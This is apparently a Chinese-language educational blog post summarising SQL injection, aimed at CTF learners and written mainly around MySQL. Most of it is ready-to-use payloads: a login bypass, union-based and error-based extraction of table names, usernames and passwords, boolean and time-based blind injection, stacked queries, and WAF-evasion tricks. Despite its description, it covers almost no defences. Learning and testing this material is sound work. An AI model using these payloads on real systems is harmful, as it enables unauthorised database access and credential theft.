---
title: "sql注入漏洞总结"
description: "SQL 注入漏洞总结，梳理漏洞原理、利用方式、绕过思路和防护要点。"
pubDate: "2025-12-07"
updatedDate: "2025-12-07"
tags: ["SQL", "漏洞总结", "Web安全"]
cover: auto
coverAlt: "sql注入漏洞总结 的文章封面"
draft: false
---
# SQL注入漏洞总结

## 什么是SQL注入漏洞

### SQL 是什么？
>
>SQL 指结构化查询语言，全称是 Structured Query Language。
>SQL 让您可以访问和处理数据库，包括数据插入、查询、更新和删除。
>SQL 语言采用英语关键词，使其易读易写。
>SQL 由国际标准化组织（ISO）和美国国家标准协会（ANSI）标准化。
>SQL 提供了丰富的操作数据的功能，从简单的查询到复杂的数据库管理操作。

### SQL 能做什么？
>
>SQL 面向数据库执行查询
>SQL 可从数据库取回数据
>SQL 可在数据库中插入新的记录
>SQL 可更新数据库中的数据
>SQL 可从数据库删除记录
>SQL 可创建新数据库
>SQL 可在数据库中创建新表
>SQL 可在数据库中创建存储过程
>SQL 可在数据库中创建视图
>SQL 可以设置表、存储过程和视图的权限

我们不难发现，SQL是一门与数据库密切相关的语言，数据库用来存放数据，而一些登录系统或者是查询的功能就存在一定的与数据库的交互，接下来我们看一些简单的例子

```
SELECT * FROM users WHERE username = 'user1' AND password = 'password1';
```

这是一个相当简单的一个查询语句，查询用户输入的内容是否在数据库中，如果用户的输入为

```
用户名： admin' --+
密码： anything
```

该语句就会变为

```
SELECT * FROM users WHERE username = 'admin' --+' AND password = 'anything';
```

--+是SQL的注释符号，这样我们就成功忽略了密码，绕过了身份验证，这就是一个简单的SQL注入

以下我们解释一下，SQL注入能干什么

### SQL 注入

SQL 注入（SQL Injection）是一种常见的网络攻击手段，攻击者通过在输入字段或请求中注入恶意的 SQL 语句，操控数据库执行意图之外的操作。

>其目标通常是：
>
>>    窃取敏感数据
>>    绕过身份验证
>>    修改、删除数据库内容
>>    执行系统命令等

SQL 注入的工作原理

    输入验证不足：当Web应用程序没有正确验证用户输入时，攻击者可以在输入字段中插入SQL代码。

    拼接SQL语句：应用程序后端通常将用户输入与SQL查询拼接在一起，形成完整的数据库查询语句。

    执行恶意SQL：如果应用程序没有对输入进行适当的清理或转义，恶意SQL代码将被数据库服务器执行。

    数据泄露或破坏：攻击者可以利用SQL注入来查询、修改或删除数据库中的数据，或者执行数据库管理系统的系统命令。


这样我们算是粗略的介绍了一下SQL注入是什么，接下来我们要讲到怎么判断sql注入以及其常见形式和注入方法

## SQL注入漏洞利用(主要以MYSQL为例)

### 如何判断SQL注入漏洞

比较常见的注入点有两种

**第一种**:可以通过GET传参(如传一个id)实现查询功能

**第二种**:有一个明显的登录界面

然后我们就可以进行简单尝试，比如对于id查询，我们可以?id=1'去看是否出现报错(对于基本无过滤的SQL注入)，然后可以?id=1\去看闭合类型，然后成功闭合后在闭合后拼接SQL语句，最后

加上注释符，然后就是一层层的进行扒库，先查数据库，再查表，然后查列，最后拿出列中的数据，这是一套最简单的流程

在SQL中常用的注释符有-- ，--+，#   (**注意-- ，这里末尾有一个空格**)

我们可以根据多个方式来了解数据库类型，比如一些特定函数，报错情况，以及前端来判断

这里不详细讲，可以去搜索相关的内容进行学习，一般在有报错的情况下，通过注入一个错误语句我们可以比较轻松的通过报错判断数据库类型

### SQL注入的类型

SQL注入一般存在这几种类型，如联合注入，报错注入，堆叠注入，布尔盲注，时间盲注，逻辑漏洞

#### 联合注入

先讲讲联合注入这个最基础的类型，通过union，select，from，where这几个常见的SQL语言我们可以做到查询数据库中的绝大多数内容

还是上面那个例子

```
SELECT * FROM users WHERE username = 'user1' AND password = 'password1';
```

加入我们在user输入框处注入一个这样的语句

```
user' union select 1,2--+
```

当存在回显且列数正确的情况下，我们将会看到我们输入的1和2被回显了，或者只回显了其中一个，通过order by可以查询列数，如

```
user' order by 3--+
```

在联合注入的功能中，union的意义就是可以在原查询语句的基础上拼接一个新的查询语句(**SQL语句一般大小写不敏感**)

既然如此我们就可以完成一系列的操作，以id形式为例，登录只需将id=后面的内容放到username栏或者password栏即可(根据具体情况修改)

```
?id=1\(判断闭合符)
id=1' order by 3--+(测列数)
?id=-1' union select 1,2,database()--+(-1没有对应字符用于显示内容，2,3可以回显，拿数据库)
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+(拿表名)
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+(拿列名)
?id=-1' union select 1,group_concat(username),group_concat(password) from users--+(成功拿出所有用户名和密码)
?id=-1 union select 1,group_concat(username),group_concat(password) from users--+(数字型查询不用闭合)
```

group_concat拼接输出内容

然后我们要讲讲waf，常见的有关键字绕过，空格绕过

比如当select被waf的时候，存在两种waf情况，一种是不让使用，一种会在拼接前将改关键字删掉

对于第一种我们可以通过以下方法绕过

```
1.大小写混合
部分过滤器仅检测小写关键字，尝试：UnIoN SeLeCT

UnIoN SeLeCT 1,2,3-- 

2.内联注释分割
在关键字中插入注释：/*!UNION*/ 或 U/**/NION

U/**/NION SEL/**/ECT 1,2,3--+


3.编码绕过

URL编码：UNION → %55%4E%49%4F%4E(注意url编码的适用情况)

十六进制编码：UNION → 0x554E494F4E

双重编码：UNION → %2555%254E%2549%254F%254E
```

第二种则只需双写该关键字即可

```
seselectlect   ununionion  oorr  anandd
```

空格绕过

```
union(select())
```

#### 报错注入

主要用了updatexml和extractvalue这两个函数，也可以有其他的方法，这里不主要说明，可以搜索学习一下报错注入可用函数

```
EXTRACTVALUE(xml_frag, xpath_expr)
UPDATEXML(xml_doc, xpath_expr, new_value)
```

```
EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))
0x7e：十六进制~符号，作为数据边界标识
1：任意合法XML文档（简化形式）
有效字符限制：实际可提取32-64字符（受1024字节总错误长度限制）

UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)
第一参数1：简化的XML文档
第三参数1：任意替换值（不影响错误触发）
字符限制：同extractvalue，约32-50可见字符

攻击原理：
第二参数必须是合法的XPath表达式。当传入包含特殊字符（如~）与目标数据拼接的字符串时，解析失败并返回包含非法表达式的错误信息。
```

一个具体的操作示例

```
?id=1' and (extractvalue(1,concat(0x7e,database(),0x7e)))--+
?id=1' and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1))--+
?id=1' and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1))--+
?id=1' and (updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1))--+
?id=1' and (updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1))--+
?id=1" and (updatexml(1,concat(0x7e,database(),0x7e),1))--+
```

相当于往第二参数处注入SQL语句，我们可以利用substr来获得后一部分没有显示出来的字符

```
-  substr(...,1,31)  截取第1到31个字符
-  substr(...,32,31)  截取第32到62个字符
```

#### 布尔盲注

布尔盲注适用于有回显，但是回显正确或者错误时回显不一样

主要利用length，substr等函数进行判断，用and或者or进行拼接，以下是一个常见的流程

```
?id=1' and length(database())=8--+(爆库长)
?id=1' and substr(database(),1,1)='s'--+
?id=1' and substr(database(),2,1)='e'--+
?id=1' and substr(database(),8,1)='y'--+(爆库名)
?id=1' and (select count(*) from information_schema.tables where table_schema=database())=4--+(爆表数)
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6--+(爆表长)
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 3,1))=5--+
?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)='u'--+
?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),5,1)='s'--+
?id=1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' )=3--+
?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1 ))=8--+
?id=1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1 ),1,1)='u'--+
?id=1' and (select count(username) from security.users)='13'--+(查username中的值数)
?id=1' and (substr(slect group_concat(username) from users),1,1)='D'--+(将username中的内容拼接为一行用于读取内容)
```

我们不难发现如果想要一个一个的手注payload需要花费大量的时间，我们可以写一个python脚本结合二分算法进行快速注入。

#### 时间盲注

与布尔盲注原理类似，不过适用于无回显

```
?id=1' and if(1=1,sleep(5),1)--+
判断参数构造。
?id=1'and if(length((select database()))>9,sleep(5),1)--+
判断数据库名长度
?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
逐一判断数据库字符
?id=1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
判断所有表名长度
?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
逐一判断表名
?id=1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20,sleep(5),1)--+
判断所有字段名的长度
?id=1'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
逐一判断字段名。
?id=1' and if(length((select group_concat(username,password) from users))>109,sleep(5),1)--+
判断字段内容长度
?id=1' and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
逐一检测内容。
```

时间盲注也可以写一个脚本来实现，判断time的时间即可

#### 堆叠注入

堆叠注入主要时利用;再开一个注入语句，类似于

```
1';show databases;#
1';show tables;#
```

也可以使用select拿出数据，show用于查看，无法获得值，进一步获取内容可以使用handler(只能取出一行内容)或者select，如果select被过滤也可以编码绕过，详见强网杯2019随便注，

可以扩展一下对SQL语句的理解，除了常见的select外，也有许多别的方法是可以在SQL注入中利用的，如update，insert，delete之类

#### 逻辑漏洞

这个不好举例，主要是用于白盒(大概，貌似SQL很少有白盒题)，黑盒去猜逻辑可能会有点困难，主要是笔者有些才疏学浅(｡•́︿•̀｡)

### SQL注入的工具

对于SQL注入这个比较成熟的体系，是存在一个专业工具的，如sqlmap，不过在学习的时候尽量不要使用，知其然及其所以然是一个很重要的过程，鼓励每一个人都可以写一个自己的盲注脚本，

这对于对代码编写能力和写脚本的能力都有作用

## 总结

SQL注入是一个很常见的漏洞类型，其中有许多的SQL语句的利用和绕过姿势的学习，虽然开始会有点波折，但是最后等你学成，你说不定会有一种经过重重磨砺用着战胜魔王的成就感
